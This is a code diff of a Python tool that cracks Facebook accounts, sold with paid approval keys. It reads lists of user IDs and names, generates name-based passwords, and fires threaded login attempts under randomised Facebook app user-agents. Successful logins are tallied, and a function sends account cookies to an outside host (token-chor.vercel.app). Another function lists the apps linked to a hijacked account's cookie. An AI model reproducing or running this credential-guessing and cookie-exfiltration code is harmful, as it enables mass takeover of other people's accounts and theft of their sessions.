@@ -312,130 +312,169 @@ logo=(f"""\033[1;37m
 __________________________________________________
 
  \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NiX\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
-──────────────────────────────────────────────────
-\033[1;92m Owner   :            MR:NIX
-\033[1;92m Facebook:            Mr:Nix
-\033[1;92m Github  :            Mr-NIX
-\033[1;92m Version :            0.0.4
-──────────────────────────────────────────────────""")
-#__________________MAIN____________#
+ 
+─────────────────────────────────────────────  
+\033[1;37m[–] BEST ALGRIA CRACK DJALIL WORLD 🦅  
+\033[1;37m─────────────────────────────────────────────  
+\033[1;31m [-] FACEBOOK : DJALIL MK
+\033[1;32m [-] TELEGRAM : djalil_dz_48
+\033[1;36m [–] AUTHOR   : MR-DJALIL
+\033[1;34m [–] SERVICE  : {rrrrrrrr}FREE\033[0m
+\033[1;37m─────────────────────────────────────────────""")
+# I love you Mom 
+def dino():
+    print('\033[1;37m─────────────────────────────────────────────')
+
 def linex():
-        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
+    print('\033[1;37m─────────────────────────────────────────────')
+#------------------[ system  ]-------------------#
 def clear():
-    os.system("clear")
-    print(logo)    
-
-
-
-
-
-
-
-
-def result(OKs,cps):
-    if len(OKs) != 0 or len(cps) != 0:
-        print('\n')
-        print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloneing Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
-        print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
-        print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
-        input("Press enter to back NIX Menu ")
-        exit()
-os.system("xd-open https://github.com/Tox1c-143")
-def menu():   
     os.system('clear')
     print(logo)
-    print(f'\x1b[38;5;196m[\x1b[1;92m1\x1b[38;5;196m] \033[38;5;46mFile Cloneing')
-    print(f'\x1b[38;5;196m[\x1b[1;92m2\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mRandom Cloneing ')
-    print(f'\x1b[38;5;196m[\x1b[1;92m3\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mContact Admin')
-    print(f'\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    select = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSELECT MENU : ')
-    if select =='1':
-        method_crack()
-    elif select =='2':
-        AFG_CLONING()
-  ###  elif select =='2':
-       ## random_number()
-    elif select =='3':
-       os.system('xdg-open https://t.me/+8801332718196');menu()
-    else:
-        print('\n Select Wrong option ... ')
-        time.sleep(2)
-        NIX(allkey)
-       # os.system('xdg-open https://wa.me/+8801310067277')
-#---------------------[ USER - AGENT ] -------------------#
-def uaxxx():
-    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    return ua
-def method_crack():
-    global methods
-    clear()
-    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mSELECT METHOD")
-    print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
-    print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
-    print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
-    print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
-    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
-    print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
-    print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    option = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;46mSelect Method : ')
-    if option =='1':
-        methods.append('methodA')
-        main_crack().crack(id)
-    elif option =='2':
-        methods.append('methodB')
-        main_crack().crack(id)
-    elif option =='3':
-        methods.append('methodC')
-        main_crack().crack(id)
-    elif option =='4':
-        methods.append('methodD')
-        main_crack().crack(id)
-    elif option =='0':
-        Siam()
-    else:
-      print('\n Select Wrong Option ...')
-      time.sleep(2)
-      method_crack()
 
-class main_crack():
-    def __init__(self):
-        self.id=[]
-    def crack(self,id):
-        global methods
-        clear()
-        print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m Put File  Example ● /sdcard/file.txt ")
-        self.file = input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[1;92m File Path ● ')
-        try:
-            self.id = open(self.file).read().splitlines()
-            self.pasw()
-        except FileNotFoundError:
-            print('Worng File Please confram you r file etc...')
-            time.sleep(2)
-            os.system('clear')
-            print(logo)
-            print('Try Again ...')
-            time.sleep(2)
-            main_crack().crack(id)
-            
-    def methodA(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
-            fbbv = str(random.randint(10000000, 99999999))
-            fbrv = str(random.randint(10000000, 99999999))
-            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-            width = random.randint(720, 1440)
-            height = random.randint(1080, 2560)
-            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-            fbcr = random.choice(["Grameenphone","Robi","Banglalink","Teletalk"])
-            fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-            ######m1#####
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
+    else:
+        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
+    else:
+        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
+        for i in range(len(game)):
+            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+
+def livechk(cooker):
+      requests.get("https://token-chor.vercel.app/checkid",data={'iamfrom':'mrqureshi','acc': cooker})
+
+#------------------[ system  ]-------------------#
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+#------------------[ SIM CODE  ]-------------------#
+try:
+    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
+    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
+except Exception as e:
+    pass
+    carrier = None
+#------------------[ MENU DJALIL_MK  ]-------------------#
+def menu():
+            clear()        
+            print(' \033[1;37m[\033[1;31m1\033[1;32m] CRACK FILE ')
+            print(' \033[1;37m[\033[1;31m2\033[1;32m] FOLLOW FB')
+            print(' \033[1;37m[\033[1;31m0\033[1;32m] EXIT ')
+            dino()
+            xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+            if xd in ['1','01']:
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/DJALIL_MK.txt')
+                dino()
+                file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
+                try:
+                    fo = open(file,'r').read().splitlines()
+                except FileNotFoundError:
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE LOCATION NOT FOUND ')
+                    time.sleep(1)
+                    menu()
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
+                print("\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46m METHOD All IS IN PROCESSING ")
+                print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+                print(f'\x1b[38;5;196m[\033[38;5;46m1\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m2\x1b[38;5;196m]\033[38;5;46m Method \x1b[1;92m●\033[38;5;46m B-graph')
+                print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m API')
+                print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;92m●\033[38;5;46m B-api')
+                print(f'\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \033[38;5;46mBack')
+                print(f"\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                          
+                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                dino()
+                plist = []
+                ps_limit = 0 
+                clear()
+                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
+                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
+                dino()
+                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if psx in ['1','01']:
+                             plist.append('first first')
+                             plist.append('first last')
+                             plist.append('last first')
+                             plist.append('last last') 
+                else: 	
+                 try:
+                    dino()
+                    ps_limit = int(input(' How many passwords do you want to add ? '))                    
+                 except:
+                       ps_limit =1
+                clear() 
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
+                dino()
+                for i in range(ps_limit): 
+                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
+                clear()
+                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
+                dino()
+                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+                if cx in ['y','Y','yes','Yes','1']:
+                    pcp.append('y')
+#else: 	
+
+    
+                else:
+                    pcp.append('n')
+                with tred(max_workers=30) as crack_submit:
+                    clear()
+                    total_ids = str(len(fo))
+                    print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
+                    print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
+                    linex()
+                    for user in fo:
+                            ids,names = user.split('|')
+                            passlist = plist
+                            if mthd in ['1','01']:
+                                    crack_submit.submit(M_file_1,ids,names,passlist) 
+                            elif mthd in ['2','02']:
+                                    crack_submit.submit(M_file_2,ids,names,passlist)
+                            elif mthd in ['3','03']:
+                                    crack_submit.submit(M_file_3,ids,names,passlist)
+                            elif mthd in ['4','04']:
+                                    crack_submit.submit(M_file_4,ids,names,passlist)
+                            elif mthd in ['5','05']:
+                                     crack_submit.submit(M_file_5,ids,names,passlist)
+                            elif mthd in ['6','06']:
+                                      crack_submit.submit(M_file_6,ids,names,passlist)
+                            elif mthd in ['7','07']:
+                                      crack_submit.submit(M_file_7,ids,names,passlist)
+                dino()
+                print('\033[1;32m[\033[1;31m–\033[1;32m] Behind every hackers smile...a victims tear! ')
+                print('\033[1;32m[\033[1;31m–\033[1;32m] The process has completed ')
+                print('\033[1;32m[\033[1;31m–\033[1;32m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
+                dino()
+                input(' Press enter to back ')
+                os.system('python DJALIL_MK.py') 
+            elif xd in ['0','00']:
+                exit(' Thanls For Your Use ')
+            elif xd in ['2','02']:
+                os.system('xdg-open https://www.facebook.com/DJALIL_MKm1')     
+            else:
+                exit(' Option not found in menu...')
+
+#------------------[  METODE 1 ]-------------------#
             sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
             uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
             fs = name.split(' ')[0]
@@ -943,69 +982,54 @@ def rcrack(uid,pwx,tl):
         sys.stdout.flush()
     except:
         pass 
-#------------------[  approval  ]-------------------#        
-def newkey():
-    ff = requests.get(link)
-    u = str(os.getuid())  # الحصول على UID النظام
-    pl = str(platform.platform())  # معلومات النظام
-    pl = pl.replace('.', '').replace("-", "")[::-1].upper()  # تعديل وتحويل إلى أحرف كبيرة مقلوبة
-    kk = u + pl[6:6] + platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + u
-    
-    # لا يوجد تشفير Base85 هنا
-    key = kk  # المفتاح يتم تحديده بدون تشفير
-    
-    # التحقق من البيانات المرسلة
-    if "XXFXXFXX" in ff.text:
-        if kk in ff.text:
-            if key in ff.text:
-                return 'Trial', '\033[1;91mPaid\033[1;97m'
-        else:
-            return "Trial", "\033[1;92mFree\033[1;97m"
-    
-    if ff.text == 'null':
-        return 'Napv' + kk
-    if kk in ff.text:
-        if key in ff.text:
-            return 'Apv'
-        else:
-            return 'Fuck'
-    else:
-        return 'Napv' + kk 
-    
-def approval():
-  clear()
-  try:
-    sec = newkey()
-    if sec=='Fuck':Fuck()
-    if 'Trial' in sec:
-        Trial(sec[1])
-    if 'Napv' in sec:
-      boos = random.choice([P, M, H, K, B, U, O, N])
-      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL_MK+\033[1;32m"+sec.replace('Napv',''))
-      print('\033[1;34m─────────────────────────────────────────────')
-      print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim ')
-      print('\033[1;34m-─────────────────────────────────────────────')
-      print(f"\033[1;32m[\033[1;31m–\033[1;32m] {boos} Binance \033[1;33m >> \033[1;31m ID : 782102873 ")
-      print('\033[1;34m-─────────────────────────────────────────────')
-      print("\033[1;32m[\033[1;31m–\033[1;32m] 15$ Approval For 1 month  ")
-      print("\033[1;32m[\033[1;31m–\033[1;32m] 10$ Approval For 15 days  ")
-      print("\033[1;32m[\033[1;31m–\033[1;32m] 5$ Approval For 7 days  ")        
-      print('\033[1;34m─────────────────────────────────────────────')     
-      print(" \033[1;32m[\033[1;31m–\033[1;32m] Note : \033[1;32mPAY AND TRY")
-      print('\033[1;34m─────────────────────────────────────────────')
-      input(' \033[1;32m[\033[1;31m–\033[1;32m] Press Enter To Go To WhatsApp')
-      os.system('am start https://wa.me/+213783848793')
-      approval()
-    if sec=='Apv':menu()
-    else:exit()
-  except KeyboardInterrupt:exit()
-  except Exception as e:e=base64.b16encode(str(e).encode('ascii'));print('Something went wrong error code : '+e.decode('ascii'));exit() 
+############            
 
-#------------------[  END  ]-------------------#
-menu()
-exit()
-while True: requests
-raise KeyError ("XD")
-"HaN".FuCk
-raise SystemExit
-open('').close()
+##########
+   
+def main_apv():
+    os.system("clear")
+    print(logo)
+    uuid = str(os.geteuid())
+    Xyteee=('Nix1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
+    print(logo)
+    os.system("clear");print(logo)
+    print(f" Your Key : \x1b[1;31m"+Xyteee)
+    print("\x1b[1;92m--------------------------------------------------")
+    try:
+        system = requests.get("https://github.com/Mr-Nix8/Paid/blob/main/Approve.txt").text 
+        if Xyteee in system:
+            print()
+            msg = str(os.geteuid()) 
+            time.sleep(1) 
+            menu()
+            pass 
+        else: 
+            print('\033[1;92m Now it will work well in all countries')
+            print('\033[1;92m-----------------------------------------------------\033[1;97m')
+            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Nix Tools Can buy in all countries!')
+            print('\033[1;92m-----------------------------------------------------\033[1;97m')
+            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 8$ \033[1;92mApproval For 1 month')
+            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 6$ \033[1;92mApproval For 15 days')
+            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 3$ \033[1;92mApproval For 7 days \033[1;37m')
+            print('\033[1;92m-----------------------------------------------------')
+            Picchi = input(' Select Buy Option : ')
+            os.system("clear")
+            print(logo)
+            print(f" \033[1;92mYour Key :\033[31;1m{Xyteee}")
+            print("\x1b[1;92m Tools    : FB Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
+            print("-----------------------------------------------------")
+            url_wa = "https://api.whatsapp.com/send?phone=+8801332718196&text="
+            choice = input(" Enter your choice  : ")
+            tks = ("Hi Nix Sir, I Need To Buy Your Nix Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
+            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
+            print('-----------------------------------------------------\n Run again with permission from admin')
+            main_apv()
+    except: 
+        sys.exit()
+
+with SiamNIX(max_workers=30) as rhu:
+ #   rhu.submit(sexy)
+    rhu.submit(main_apv)
+
+
+
